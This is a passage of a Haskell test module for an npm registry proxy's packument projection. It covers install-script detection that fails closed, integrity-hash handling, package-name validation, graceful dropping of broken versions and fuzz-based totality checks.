module Ecluse.Registry.Npm.ProjectSpec (spec) where

import Data.Aeson (
    Value (Array, Bool, Null, Number, Object, String),
    eitherDecodeStrict,
    encode,
    object,
    (.=),
 )
import Data.Aeson.Key qualified as Key
import Data.Aeson.KeyMap qualified as KeyMap
import Data.ByteString.Lazy qualified as BL
import Data.Map.Strict qualified as Map
import Data.Text qualified as T
import Data.Text.Short qualified as TS
import Data.Time (UTCTime)
import Data.Time.Format.ISO8601 (iso8601ParseM)
import Data.Vector qualified as V
import Hedgehog (PropertyT, annotateShow, forAll, (===))
import Hedgehog qualified as H
import Hedgehog.Gen qualified as Gen
import Hedgehog.Range qualified as Range
import Test.Hspec (Spec, describe, it, shouldBe, shouldNotSatisfy, shouldSatisfy)
import Test.Hspec.Hedgehog (hedgehog)

import Ecluse.Core.Ecosystem (Ecosystem (Npm))
import Ecluse.Core.Package (
    Artifact (artFilename, artHashes, artInterpreter, artKind, artProvenance, artSize, artUrl, artYanked),
    ArtifactKind (Tarball),
    Availability (Available, Deprecated),
    CodeExecSignal (NoCodeOnInstall, RunsCodeOnInstall),
    DepKind (Dev, Optional, Peer, Runtime),
    Dependency (depConstraint, depKind, depMarker, depName),
    HashAlg (SHA1, SRI),
    PackageDetails (..),
    PackageInfo (..),
    PackageName,
    Person (Person),
    Trust (TrustUnknown),
    mkPackageName,
    mkScope,
    pkgCanonical,
    pkgNamespace,
    renderScope,
 )
import Ecluse.Core.Registry (ParseError, RegistryResponse (RegistryResponse))
import Ecluse.Core.Registry.Npm.Project (
    Projection (NameMismatch, Projected),
    VersionProjection (VersionNameMismatch, VersionProjected),
    parsePackageInfo,
    parsePackageInfoFromValue,
    parseVersionDetails,
    parseVersionDetailsFromValue,
    parseVersionList,
 )
import Ecluse.Core.Version (Version, mkVersion, renderVersion, unVersion)
import Ecluse.Test.Package (unsafeHash)

{- | Projection tests for the npm adapter. They assert the __domain__ values a
fetched packument projects into — the second half of the boundary that
"Ecluse.Registry.Npm.WireSpec" tests the decode half of. The fixtures under
@core\/test\/unit\/fixtures\/npm\/@ are the same captures the wire suite uses; a few
edge cases (a full-form install-script derivation, a missing @time@ entry, a
malformed body) are inline JSON literals.

The cases pin down the signal-mapping table: install-script presence (flagged,
derived, and absent) onto 'CodeExecSignal'; @deprecated@ onto 'Availability';
the @dist@ integrity pair onto __both__ a 'SHA1' and an 'SRI' 'Hash'; @_npmUser@
onto 'pkgPublisher'; @time[version]@ onto 'pkgPublishedAt'; and scoped names onto
'Ecluse.Core.Package.Scope'.
-}
spec :: Spec
spec = do
    packageInfoSpec
    nameValidationSpec
    signalMappingSpec
    integritySpec
    versionDetailsSpec
    targetedVersionParitySpec
    versionListSpec
    versionLevelLeniencySpec
    failureSpec
    totalitySpec

-- ── packument-level projection ───────────────────────────────────────────────

packageInfoSpec :: Spec
packageInfoSpec = describe "parsePackageInfo" $ do
    it "projects the package name, versions, and dist-tags (is-odd)" $ do
        info <- projectFixture (unscoped "is-odd") "is-odd.full.json"
        renderName (infoName info) `shouldBe` "is-odd"
        Map.keys (infoVersions info) `shouldBe` ["3.0.1"]
        fmap renderVersion (Map.lookup "latest" (infoDistTags info)) `shouldBe` Just "3.0.1"

    it "keys the publish-time map by raw version, dropping created/modified" $ do
        -- The packument `time` map also carries `created`/`modified`; only the
        -- per-version entries are publish times, so those bookkeeping keys must
        -- not leak into the projected map.
        info <- projectFixture (unscoped "is-odd") "is-odd.full.json"
        published <- readUTC "2018-05-31T20:04:53.306Z"
        infoPublishedAt info `shouldBe` Map.singleton "3.0.1" published

    it "splits a scoped name into scope and bare name (@babel/code-frame)" $ do
        info <- projectFixture (mkPackageName Npm (Just (mkScope "babel")) "code-frame") "babel-code-frame.abbreviated.json"
        fmap renderScope (pkgNamespace (infoName info)) `shouldBe` Just "@babel"
        pkgCanonical (infoName info) `shouldBe` "@babel/code-frame"

    it "leaves the publish-time map empty for an abbreviated document (no time)" $ do
        -- The abbreviated form omits the `time` map entirely, so every version's
        -- publish time is unknown.
        info <- projectFixture (unscoped "core-js") "core-js.abbreviated.json"
        infoPublishedAt info `shouldBe` Map.empty

-- ── name as a validation input (route name is the authority) ──────────────────

nameValidationSpec :: Spec
nameValidationSpec = describe "name validation against the requested name" $ do
    it "projects a document whose self-reported name matches the request" $ do
        -- The served name is a value the upstream genuinely reported (it matched).
        case parsePackageInfoFromValue (unscoped "thing") (packumentValueNamed "thing") of
            Right (Projected info) -> renderName (infoName info) `shouldBe` "thing"
            other -> fail ("expected a matching projection, got: " <> show other)

    it "flags a document whose self-reported name disagrees with the request" $ do
        -- A present-but-different name is a NameMismatch carrying the upstream's
        -- self-reported name (for the audit log) — never a rewrite to the route name.
        parsePackageInfoFromValue (unscoped "thing") (packumentValueNamed "other")
            `shouldBe` Right (NameMismatch "other")

    it "validates the scope, not just the bare name (@scope/a is not @scope/b)" $
        parsePackageInfoFromValue (mkPackageName Npm (Just (mkScope "scope")) "a") (packumentValueNamed "@scope/b")
            `shouldBe` Right (NameMismatch "@scope/b")

    it "treats a present-but-different name as a mismatch, not a decode failure (handle field rejects it)" $
        -- The handle's typed-view accessor collapses a mismatch to a ParseError: it
        -- cannot yield a valid view of the requested package from a different one's document.
        parsePackageInfo (unscoped "thing") (responseNamed "other") `shouldSatisfy` isLeft

    it "never substitutes the served name: a match carries the upstream's own name" $ do
        -- The route name is the validation authority, not a rewrite: infoName is the
        -- name the upstream reported (here equal to the request, having matched).
        case parsePackageInfoFromValue (unscoped "thing") (packumentValueNamed "thing") of
            Right (Projected info) -> infoName info `shouldBe` unscoped "thing"
            other -> fail ("expected a matching projection, got: " <> show other)

-- ── the signal-mapping table ─────────────────────────────────────────────────

signalMappingSpec :: Spec
signalMappingSpec = describe "signal mapping" $ do
    describe "install-script presence → CodeExecSignal" $ do
        it "maps an abbreviated hasInstallScript:true to RunsCodeOnInstall (core-js)" $ do
            d <- projectVersion "core-js.abbreviated.json" (mkVersion Npm "3.49.0")
            pkgInstallCode d `shouldSatisfy` runsCode

        it "derives RunsCodeOnInstall from a full-form postinstall script" $ do
            -- The full manifest has NO hasInstallScript key; presence is derived
            -- from `scripts` having one of preinstall/install/postinstall.
            d <- projectVersionOf fullPostinstallPackument (mkVersion Npm "1.0.0")
            pkgInstallCode d `shouldSatisfy` runsCode

        it "maps no install-script signal to NoCodeOnInstall (is-odd has only `test`)" $ do
            -- is-odd's only script is `test`, which does not run on install.
            d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
            pkgInstallCode d `shouldBe` NoCodeOnInstall
            pkgInstallCode d `shouldNotSatisfy` runsCode

        it "maps an explicit hasInstallScript:false to NoCodeOnInstall" $ do
            -- The abbreviated flag, when present and false and no install hook is
            -- declared in `scripts`, is a determination that installation runs no
            -- code.
            d <- projectVersionOf noInstallScriptPackument (mkVersion Npm "1.0.0")
            pkgInstallCode d `shouldBe` NoCodeOnInstall

        it "fails closed when hasInstallScript:false contradicts a declared postinstall script" $ do
            -- The flag and the `scripts` map are independent wire fields: a hostile
            -- upstream must not be able to mask a real install hook by lying in the
            -- sibling flag, so the declared script is authoritative (RunsCodeOnInstall).
            d <- projectVersionOf falseFlagWithPostinstallPackument (mkVersion Npm "1.0.0")
            pkgInstallCode d `shouldSatisfy` runsCode

    describe "deprecated → Availability" $ do
        it "maps a deprecation notice to Deprecated carrying the message (request)" $ do
            d <- projectVersion "request.full.json" (mkVersion Npm "2.88.2")
            pkgAvailability d
                `shouldBe` Deprecated
                    "request has been deprecated, see https://github.com/request/request/issues/3142"

        it "maps the absence of a notice to Available (is-odd)" $ do
            d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
            pkgAvailability d `shouldBe` Available

    describe "_npmUser → pkgPublisher" $ do
        it "projects the publisher from the version object (is-odd)" $ do
            d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
            pkgPublisher d `shouldBe` Just (Person "jonschlinkert" (Just "github@sellside.com") Nothing)

        it "leaves the publisher absent when _npmUser is missing (request)" $ do
            d <- projectVersion "request.full.json" (mkVersion Npm "2.88.2")
            pkgPublisher d `shouldBe` Nothing

    describe "maintainers → pkgMaintainers" $ do
        it "projects the version's maintainers, distinct from the publisher" $ do
            d <- projectVersionOf maintainersPackument (mkVersion Npm "1.0.0")
            pkgMaintainers d `shouldBe` [Person "carol" (Just "carol@example.test") Nothing]

        it "leaves maintainers empty when the version declares none (is-odd)" $ do
            -- The is-odd packument carries maintainers at the package level only;
            -- its version manifest has none.
            d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
            pkgMaintainers d `shouldBe` []

    describe "time[version] → pkgPublishedAt" $ do
        it "fills the publish time from the packument time map (is-odd)" $ do
            d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
            published <- readUTC "2018-05-31T20:04:53.306Z"
            pkgPublishedAt d `shouldBe` Just published

        it "leaves the publish time Nothing when no time entry exists (abbreviated)" $ do
            d <- projectVersion "core-js.abbreviated.json" (mkVersion Npm "3.49.0")
            pkgPublishedAt d `shouldBe` Nothing

    describe "unfetched trust → TrustUnknown" $
        it "leaves trust unknown (pure projection performs no signature check)" $ do
            d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
            pkgTrust d `shouldBe` TrustUnknown

    describe "license → pkgLicenses" $ do
        it "projects a bare SPDX string license (is-odd → MIT)" $ do
            d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
            pkgLicenses d `shouldBe` ["MIT"]

        it "projects the legacy object license to its name (request → Apache-2.0)" $ do
            d <- projectVersion "request.full.json" (mkVersion Npm "2.88.2")
            pkgLicenses d `shouldBe` ["Apache-2.0"]

    describe "dependencies → pkgDependencies (kept raw, tagged by kind)" $ do
        it "keeps the constraint raw and carries no marker (npm has no PEP 508)" $ do
            d <- projectVersionOf allDepKindsPackument (mkVersion Npm "1.0.0")
            let runtimeDep = find ((== "runtime-dep") . depName) (pkgDependencies d)
            fmap (\x -> (depConstraint x, depMarker x)) runtimeDep `shouldBe` Just ("^1.0.0", Nothing)

        it "tags runtime, dev, peer, and optional dependencies across all four maps" $ do
            d <- projectVersionOf allDepKindsPackument (mkVersion Npm "1.0.0")
            let kindOf n = depKind <$> find ((== n) . depName) (pkgDependencies d)
            kindOf "runtime-dep" `shouldBe` Just Runtime
            kindOf "dev-dep" `shouldBe` Just Dev
            kindOf "peer-dep" `shouldBe` Just Peer
            kindOf "optional-dep" `shouldBe` Just Optional

-- ── integrity: BOTH digests survive ──────────────────────────────────────────

integritySpec :: Spec
integritySpec = describe "dist → Artifact integrity" $ do
    it "carries BOTH the SHA-1 shasum and the SRI integrity (is-odd)" $ do
        -- Neither digest may be dropped: a cross-upstream merge compares both to
        -- detect a same-version integrity divergence.
        d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
        artHashes (soleArtifact d)
            `shouldBe` [ unsafeHash SRI "sha512-CQpnWPrDwmP1+SMHXZhtLtJv90yiyVfluGsX5iNCVkrhQtU3TQHsUWPG9wkdk9Lgd5yNpAg9jQEo90CBaXgWMA=="
                       , unsafeHash SHA1 "65101baf3727d728b66fa62f50cda7f2d3989601"
                       ]

    it "projects exactly one tarball artifact with the dist URL (is-odd)" $ do
        d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
        length (pkgArtifacts d) `shouldBe` 1
        artKind (soleArtifact d) `shouldBe` Tarball
        artUrl (soleArtifact d) `shouldBe` "https://registry.npmjs.org/is-odd/-/is-odd-3.0.1.tgz"

    it "derives the artifact filename from the URL's last path segment (is-odd)" $ do
        d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
        artFilename (soleArtifact d) `shouldBe` "is-odd-3.0.1.tgz"

    it "leaves npm-irrelevant artifact fields at their explicit defaults (is-odd)" $ do
        -- npm has no per-file yank, interpreter constraint, or separate
        -- provenance URL on the artifact; these stay at their unknown/false
        -- defaults rather than being fabricated.
        d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
        let art = soleArtifact d
        artInterpreter art `shouldBe` Nothing
        artYanked art `shouldBe` False
        artProvenance art `shouldBe` Nothing

    it "carries the unpacked size as the artifact size (inline dist)" $ do
        d <- projectVersionOf sizedPackument (mkVersion Npm "1.0.0")
        artSize (soleArtifact d) `shouldBe` Just 6510

    it "falls back to <version>.tgz when the tarball URL has no filename segment" $ do
        -- A dist URL ending in a slash has no last segment, so the filename
        -- falls back to the conventional <version>.tgz form.
        d <- projectVersionOf trailingSlashPackument (mkVersion Npm "1.0.0")
        artFilename (soleArtifact d) `shouldBe` "1.0.0.tgz"

    it "keeps the SRI integrity even when the shasum is absent (inline dist)" $ do
        -- An integrity-only dist still yields the SRI hash (and only it).
        d <- projectVersionOf integrityOnlyPackument (mkVersion Npm "1.0.0")
        artHashes (soleArtifact d)
            `shouldBe` [unsafeHash SRI "sha512-z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXcg/SpIdNs6c5H0NE8XYXysP+DGNKHfuwvY7kxvUdBeoGlODJ6+SfaPg=="]

    it "keeps the SHA-1 shasum even when the integrity is absent (inline dist)" $ do
        d <- projectVersionOf shasumOnlyPackument (mkVersion Npm "1.0.0")
        artHashes (soleArtifact d) `shouldBe` [unsafeHash SHA1 "da39a3ee5e6b4b0d3255bfef95601890afd80709"]

    it "treats an empty-string shasum as no digest (a content-empty digest is absent)" $ do
        -- An empty `shasum` decodes to a present `Just ""`, but it ties the version to no
        -- tamper-evident fingerprint. It must project to NO Hash — not a degenerate
        -- `Hash SHA1 ""` that would pass the list-emptiness admission gate.
        d <- projectVersionOf emptyShasumPackument (mkVersion Npm "1.0.0")
        artHashes (soleArtifact d) `shouldBe` []

    it "treats an empty-string integrity as no digest (a content-empty digest is absent)" $ do
        d <- projectVersionOf emptyIntegrityPackument (mkVersion Npm "1.0.0")
        artHashes (soleArtifact d) `shouldBe` []

    it "yields a truly hashless artifact when both digests are empty strings" $ do
        -- Both digests empty → empty artHashes → the version contributes no integrity
        -- fingerprint at all (rather than a degenerate empty one) to the cross-upstream
        -- divergence check, and classifies as NoIntegrity for the admission gate.
        d <- projectVersionOf emptyBothPackument (mkVersion Npm "1.0.0")
        artHashes (soleArtifact d) `shouldBe` []

-- ── parseVersionDetails ──────────────────────────────────────────────────────

versionDetailsSpec :: Spec
versionDetailsSpec = describe "parseVersionDetails" $ do
    it "projects the requested version's details (is-odd@3.0.1)" $ do
        d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
        renderVersion (pkgVersion d) `shouldBe` "3.0.1"
        renderName (pkgName d) `shouldBe` "is-odd"

    it "fails when the requested version is absent from the packument" $ do
        body <- readFixture "is-odd.full.json"
        parseVersionDetails (RegistryResponse body) (mkVersion Npm "99.99.99")
            `shouldSatisfy` isLeft

-- ── targeted single-version projection parity ────────────────────────────────

{- | 'parseVersionDetailsFromValue' is the version-__targeted__ projector the
trusted-tarball serve leg uses: it projects only the requested version from an
already-decoded packument @Value@, never the others. This block is the proof that
narrowing the private leg that way leaves the security-decisive gate __unchanged__:
for the same @Value@, requested name, and version, the targeted projector must yield
the __same__ outcome the whole-packument projection does — the same projected version
count (so the version-count response bound fires identically), the same name-mismatch
verdict, and the __same 'PackageDetails'__ (or the same absence) the full projection
holds at that version.

Because the trusted-tarball gate downstream — the artifact selected by filename
('artifactFor', mirrored here as 'selectArtifact') and the trusted-integrity-floor
decision over it — is a __pure function of that 'PackageDetails'__, identical details
entail an identical selected 'Artifact' and an identical floor outcome for every
filename and floor. The cases pin the representative shapes the task enumerates
(multi-version, the requested version present and absent, a below-trusted-floor
SHA-1-only artifact, a hashless artifact, a non-conventional trailing-slash @artUrl@,
and a filename that matches and one that does not), and a generative property confirms
the equivalence over arbitrary fuzzed bodies on all three arms (present, absent,
mismatched name).
-}
targetedVersionParitySpec :: Spec
targetedVersionParitySpec = describe "parseVersionDetailsFromValue (targeted) parity with the full projection" $ do
    it "matches a full-projection lookup for a present version (multi-version)" $ do
        v <- decodeValue multiVersionPackument
        targetedOutcome (unscoped "multi") v (mkVersion Npm "1.2.0")
            `shouldBe` fullOutcome (unscoped "multi") v (mkVersion Npm "1.2.0")
        targetedDetails (unscoped "multi") v (mkVersion Npm "1.2.0") `shouldSatisfy` isJust

    it "agrees on an absent version (no details, same projected count)" $ do
        v <- decodeValue multiVersionPackument
        targetedOutcome (unscoped "multi") v (mkVersion Npm "99.99.99")
            `shouldBe` fullOutcome (unscoped "multi") v (mkVersion Npm "99.99.99")
        targetedDetails (unscoped "multi") v (mkVersion Npm "99.99.99") `shouldBe` Nothing

    it "reports a name mismatch exactly as the full projection does" $ do
        let v = packumentValueNamed "other"
        targetedOutcome (unscoped "thing") v (mkVersion Npm "1.0.0")
            `shouldBe` fullOutcome (unscoped "thing") v (mkVersion Npm "1.0.0")
        targetedOutcome (unscoped "thing") v (mkVersion Npm "1.0.0") `shouldBe` Mismatch "other"

    it "agrees on a below-trusted-floor (SHA-1-only) artifact's details" $ do
        v <- decodeValue shasumOnlyPackument
        targetedOutcome (unscoped "sha") v (mkVersion Npm "1.0.0")
            `shouldBe` fullOutcome (unscoped "sha") v (mkVersion Npm "1.0.0")

    it "agrees on a hashless artifact's details" $ do
        v <- decodeValue emptyBothPackument
        targetedOutcome (unscoped "eb") v (mkVersion Npm "1.0.0")
            `shouldBe` fullOutcome (unscoped "eb") v (mkVersion Npm "1.0.0")

    it "agrees on a non-conventional (trailing-slash) tarball URL's details" $ do
        v <- decodeValue trailingSlashPackument
        targetedOutcome (unscoped "slash") v (mkVersion Npm "1.0.0")
            `shouldBe` fullOutcome (unscoped "slash") v (mkVersion Npm "1.0.0")

    it "selects the same Artifact by filename — a match and a miss — as the full path" $ do
        v <- decodeValue multiVersionPackument
        let ver = mkVersion Npm "1.2.0"
        selectArtifact "b.tgz" (targetedDetails (unscoped "multi") v ver)
            `shouldBe` selectArtifact "b.tgz" (fullDetails (unscoped "multi") v ver)
        selectArtifact "nope.tgz" (targetedDetails (unscoped "multi") v ver)
            `shouldBe` selectArtifact "nope.tgz" (fullDetails (unscoped "multi") v ver)
        selectArtifact "b.tgz" (targetedDetails (unscoped "multi") v ver) `shouldSatisfy` isJust

    it "agrees with the full projection over arbitrary fuzzed bodies (present, absent, mismatched)" $
        hedgehog $ do
            v <- forAll genBody
            annotateShow v
            let route = routeNameOf v
                -- 'genPackumentish' keys its versions map by 1.0.0; this requests it.
                present = mkVersion Npm "1.0.0"
                absent = mkVersion Npm "7.7.7-absent"
            -- The body's own self-reported name drives the success (Projected) arm…
            fullOutcome route v present === targetedOutcome route v present
            fullOutcome route v absent === targetedOutcome route v absent
            -- …and a deliberately different requested name drives the mismatch arm.
            fullOutcome (unscoped "definitely-not-the-name") v present
                === targetedOutcome (unscoped "definitely-not-the-name") v present
            H.cover 3 "selects a present version" (isMatchedJust (targetedOutcome route v present))
            H.cover 3 "the requested version is absent" (isMatchedNothing (targetedOutcome route v absent))

-- ── parseVersionList ─────────────────────────────────────────────────────────

versionListSpec :: Spec
versionListSpec = describe "parseVersionList" $ do
    it "lists the packument's versions, preserving the raw strings (is-odd)" $ do
        body <- readFixture "is-odd.full.json"
        fmap (map unVersion) (parseVersionList (RegistryResponse body)) `shouldBe` Right ["3.0.1"]

    it "lists every key for a multi-version inline packument, in key order" $ do
        vs <- orFailParse (parseVersionList (RegistryResponse multiVersionPackument))
        map unVersion vs `shouldBe` ["1.0.0", "1.2.0", "2.0.0"]

-- ── version-level graceful degradation ───────────────────────────────────────

{- | One version broken in a required\/security-decisive field must be __dropped__
from the decision surface, never deny the whole package. A version that cannot be
decoded cannot be evaluated for integrity, CVEs, or rules, so dropping it is
fail-closed for that version while every healthy sibling still projects. This is
the projection-layer (production serve path) guard for the wholesale-denial DoS;
the served-surface end is proven in "Ecluse.Registry.Npm.FilterSpec".
-}
versionLevelLeniencySpec :: Spec
versionLevelLeniencySpec = describe "version-level graceful degradation (one broken version never denies the package)" $ do
    it "drops every version broken in a distinct required field, keeping the healthy one" $ do
        info <- orFailParse (parsePackageInfo (unscoped "mix") (RegistryResponse mixedHealthAndBrokenPackument))
        Map.keys (infoVersions info) `shouldBe` ["1.0.0"]

    it "keeps the surviving version's load-bearing artifact intact" $ do
        info <- orFailParse (parsePackageInfo (unscoped "mix") (RegistryResponse mixedHealthAndBrokenPackument))
        case Map.lookup "1.0.0" (infoVersions info) of
            Just d -> artUrl (soleArtifact d) `shouldBe` "https://r/mix/-/mix-1.0.0.tgz"
            Nothing -> fail "the healthy version 1.0.0 must survive"

    it "drops a bare-scalar version entry rather than failing the packument" $ do
        -- A version whose value is a scalar (not even an object) is dropped, not a
        -- wholesale parse failure — the old policy this case used to assert.
        info <-
            orFailParse
                ( parsePackageInfo
                    (unscoped "x")
                    (RegistryResponse "{\"name\":\"x\",\"versions\":{\"1.0.0\":42}}")
                )
        Map.keys (infoVersions info) `shouldBe` []

    it "lists only the versions that decode (parseVersionList)" $
        fmap (map unVersion) (parseVersionList (RegistryResponse mixedHealthAndBrokenPackument))
            `shouldBe` Right ["1.0.0"]

    it "resolves a surviving version's details while a broken sibling is absent" $ do
        d <- projectVersionOf mixedHealthAndBrokenPackument (mkVersion Npm "1.0.0")
        renderVersion (pkgVersion d) `shouldBe` "1.0.0"
        parseVersionDetails (RegistryResponse mixedHealthAndBrokenPackument) (mkVersion Npm "2.0.0")
            `shouldSatisfy` isLeft

    it "keeps a version carrying junk advisory fields, degrading the field (production Value path)" $ do
        -- The complement to the drop cases: advisory junk degrades the field but the
        -- version SURVIVES. 2.0.0 carries an out-of-range unpackedSize and a signature
        -- missing its keyid; 3.0.0 a non-array signatures. Both must remain — the
        -- degraded unpackedSize projecting to no artifact size, the load-bearing
        -- tarball/integrity intact. Driven through parsePackageInfoFromValue, the very
        -- entry the serve path projects the decoded body with, so the field-level and
        -- version-level leniency are proven to compose on the production decode path.
        value <- decodeValue advisoryJunkPackument
        case parsePackageInfoFromValue (unscoped "adv") value of
            Right (Projected info) -> do
                Map.keys (infoVersions info) `shouldBe` ["1.0.0", "2.0.0", "3.0.0"]
                case Map.lookup "2.0.0" (infoVersions info) of
                    Just d -> do
                        let art = soleArtifact d
                        artSize art `shouldBe` Nothing
                        artUrl art `shouldBe` "https://r/adv/-/adv-2.0.0.tgz"
                        artHashes art
                            `shouldBe` [unsafeHash SRI "sha512-z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXcg/SpIdNs6c5H0NE8XYXysP+DGNKHfuwvY7kxvUdBeoGlODJ6+SfaPg=="]
                    Nothing -> fail "the advisory-junk version 2.0.0 must survive"
                Map.member "3.0.0" (infoVersions info) `shouldBe` True
            other -> fail ("expected a Projected packument, got: " <> show other)

-- ── failure handling ─────────────────────────────────────────────────────────

failureSpec :: Spec
failureSpec = describe "malformed input" $ do
    it "reports a ParseError on a body that is not JSON" $
        parsePackageInfo (unscoped "thing") (RegistryResponse "this is not json") `shouldSatisfy` isLeft

    it "reports a ParseError on an empty package name" $
        -- An absent/empty `name` cannot yield a PackageName, so it is a decode-level
        -- ParseError — distinct from a present-but-different name (a mismatch).
        parsePackageInfo (unscoped "thing") (RegistryResponse "{\"name\":\"\"}") `shouldSatisfy` isLeft

    it "reports a ParseError on a JSON value that is not a packument object" $
        -- Valid JSON of the wrong shape (here an array) is reported, not crashed.
        parsePackageInfo (unscoped "thing") (RegistryResponse "[1,2,3]") `shouldSatisfy` isLeft

    it "reports a ParseError when versions itself is not an object" $
        -- The top-level `versions` must be an object to enumerate versions at all; a
        -- scalar there leaves the document unusable, so it fails wholesale (distinct
        -- from a single malformed version ENTRY, which is dropped — see the
        -- version-level graceful degradation block).
        parsePackageInfo (unscoped "x") (RegistryResponse "{\"name\":\"x\",\"versions\":5}")
            `shouldSatisfy` isLeft

    it "fails parseVersionList on a non-JSON body too" $
        parseVersionList (RegistryResponse "nope") `shouldSatisfy` isLeft

-- ── projection totality (the fuzz target) ────────────────────────────────────

{- | The projection eats __untrusted__ upstream JSON (it decodes the response
body internally with 'eitherDecodeStrict' and then walks the wire shape into the
domain model), so every @parse*@ entry must be __total__: an arbitrary body may
never make it bottom; it must always return a typed 'Right' or a typed
@ParseError@ 'Left', never ⊥. These generative properties feed each entry point a
bounded-but-arbitrary 'Value' (encoded to a body) and a run of arbitrary bytes,
then fully evaluate the result so a partial function anywhere in the projection
surfaces as a caught exception rather than a pass. They are the projection-layer
companion to the wire-decoder totality properties in
"Ecluse.Registry.Npm.WireSpec".
-}
totalitySpec :: Spec
totalitySpec = describe "projection totality (arbitrary input never bottoms)" $ do
    describe "every projection entry is total over an arbitrary Value body" $ do
        it "parsePackageInfo" $
            hedgehog (projectionIsTotal (showResult . parsePackageInfo (unscoped "thing")))
        it "parseVersionList" $
            hedgehog (projectionIsTotal (showResult . parseVersionList))
        it "parseVersionDetails" $
            hedgehog
                ( projectionIsTotal
                    (\r -> showResult (parseVersionDetails r (mkVersion Npm "1.0.0")))
                )

    describe "every projection entry is total over arbitrary bytes" $ do
        it "parsePackageInfo" $
            hedgehog (projectionBytesIsTotal (showResult . parsePackageInfo (unscoped "thing")))
        it "parseVersionList" $
            hedgehog (projectionBytesIsTotal (showResult . parseVersionList))
        it "parseVersionDetails" $
            hedgehog
                ( projectionBytesIsTotal
                    (\r -> showResult (parseVersionDetails r (mkVersion Npm "1.0.0")))
                )

    it "the body generator reaches both a decodable packument and a rejected body" $
        hedgehog $ do
            v <- forAll genBody
            let resp = RegistryResponse (encodeToBody v)
                -- Validate against the body's own self-reported name so a
                -- packument-shaped body reaches the success arm (name matches),
                -- while arbitrary JSON still rejects — both arms stay sampled.
                decoded = parsePackageInfo (routeNameOf v) resp
            annotateShow v
            _ <- H.eval (showResult decoded)
            -- Non-vacuity: 'genBody' must reach both the projects-to-domain arm
            -- (the packument-shaped half) and the rejected-body arm (the
            -- arbitrary half), so the totality checks above are not all-failures.
            H.cover 5 "projects (Right)" (isRight decoded)
            H.cover 5 "rejects (Left)" (isLeft decoded)

-- ── totality helpers ─────────────────────────────────────────────────────────

{- | Assert a projection entry is __total__ over an arbitrary 'Value' body: encode
a 'genBody' value (which mixes fully-arbitrary JSON with packument-shaped objects,
so the __success__ path of the projection is exercised too, not just rejection)
into a response body and fully evaluate the entry's result (the @render@ argument
forces it to a 'String'), so 'H.eval' turns any bottom inside the projection into
a caught test failure rather than a pass.
-}
projectionIsTotal :: (RegistryResponse -> String) -> PropertyT IO ()
projectionIsTotal render = do
    v <- forAll genBody
    annotateShow v
    _ <- H.eval (length (render (RegistryResponse (encodeToBody v))))
    H.success

{- | Assert a projection entry is total over arbitrary bytes: a garbage body must
yield a typed 'ParseError' 'Left', never a crash.
-}
projectionBytesIsTotal :: (RegistryResponse -> String) -> PropertyT IO ()
projectionBytesIsTotal render = do
    bytes <- forAll (Gen.bytes (Range.linear 0 64))
    _ <- H.eval (length (render (RegistryResponse bytes)))
    H.success

-- | Force a projection result fully by rendering both arms to a 'String'.
showResult :: (Show a) => Either ParseError a -> String
showResult = \case
    Left e -> show e :: String
    Right a -> show a :: String

-- | Encode a generated 'Value' into a strict response body.
encodeToBody :: Value -> ByteString
encodeToBody = BL.toStrict . encode

{- | A recursive, depth- and breadth-__bounded__ arbitrary 'Aeson.Value' (the same
shape as "Ecluse.Registry.Npm.WireSpec"'s generator, kept in-file to avoid a new
module): the JSON scalar kinds plus small arrays and objects of recursively-
generated values, shrinking toward the scalars so it terminates. Object keys are
biased toward the real packument field names (@name@, @versions@, @dist-tags@, …)
so a generated object routinely reaches the projection's success arm.
-}
genValue :: H.Gen Value
genValue =
    Gen.recursive
        Gen.choice
        [ pure Null
        , Bool <$> Gen.bool
        , Number . fromInteger <$> genInteger
        , String <$> genJsonText
        ]
        [ Array . V.fromList <$> Gen.list (Range.linear 0 4) genValue
        , Object . KeyMap.fromList
            <$> Gen.list (Range.linear 0 4) ((,) <$> genKey <*> genValue)
        ]

{- | A response-body generator that mixes fully-arbitrary JSON ('genValue') with
packument-__shaped__ objects ('genPackumentish'), so a property driving a
projection reaches __both__ arms: arbitrary JSON almost always rejects (a 'Left'),
while a packument-shaped object usually projects (a 'Right'). The wire decoders
are lenient, so even the shaped half carries arbitrary values in its fields — it
is a /shape/ bias, not a valid-document oracle, which keeps the fuzzing honest.
-}
genBody :: H.Gen Value
genBody = Gen.frequency [(1, genValue), (1, genPackumentish)]

{- | A top-level object shaped like an npm packument: a (usually non-empty) string
@name@, a @versions@ map keyed by @1.0.0@ (the version 'parseVersionDetails' asks
for) whose entries are arbitrary objects carrying a @dist@ object, plus an
arbitrary @time@\/@dist-tags@. The values inside are still arbitrary, so this only
biases the /shape/ toward the projection's success arm; it does not hand-build a
known-valid document.
-}
genPackumentish :: H.Gen Value
genPackumentish = do
    name <- Gen.text (Range.linear 1 8) Gen.alphaNum
    versionObj <- genVersionish
    extra <- Gen.list (Range.linear 0 3) ((,) <$> genKey <*> genValue)
    pure . Object . KeyMap.fromList $
        [ (Key.fromText "name", String name)
        , (Key.fromText "versions", Object (KeyMap.singleton (Key.fromText "1.0.0") versionObj))
        ]
            <> extra

{- | A version-object-shaped 'Value': @name@\/@version@ strings and a @dist@ with a
@tarball@ URL string, plus a few arbitrary keys — enough that the wire manifest
decodes and the artifact projection has a tarball to read.
-}
genVersionish :: H.Gen Value
genVersionish = do
    tarball <- genJsonText
    extra <- Gen.list (Range.linear 0 3) ((,) <$> genKey <*> genValue)
    pure . Object . KeyMap.fromList $
        [ (Key.fromText "name", String "pkg")
        , (Key.fromText "version", String "1.0.0")
        , (Key.fromText "dist", Object (KeyMap.singleton (Key.fromText "tarball") (String tarball)))
        ]
            <> extra

{- | A small arbitrary integer to seed a JSON number (kept in a modest range;
